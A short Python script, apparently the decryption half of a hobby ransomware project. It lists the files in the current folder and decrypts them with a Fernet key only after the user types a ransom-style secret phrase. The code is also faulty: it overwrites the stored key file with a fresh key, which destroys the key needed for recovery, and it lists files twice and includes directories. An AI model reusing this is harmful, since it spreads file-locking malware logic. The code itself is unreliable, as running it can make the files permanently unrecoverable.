import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encrypt.py" or file == "the_key.key" or file == "decrypt.py":
        continue
    files.append(file)
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("the_key.key", "rb") as key:
    secret_key = key.read()

key = Fernet.generate_key()
# print(key)

with open("the_key.key", "wb") as the_key:
    the_key.write(key)

secret_phrase = "coding-rules"
user_input = input("Enter the secret phrase to decrypt your files\n")

if user_input == secret_phrase:
    for file in files:
        with open(file, "rb") as the_file:
            contents = the_file.read()
        contents_encrypted = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as the_file:
            the_file.write(contents_encrypted)
        print("files decrypted")
else:
    print("Sorry phrase does not match...")


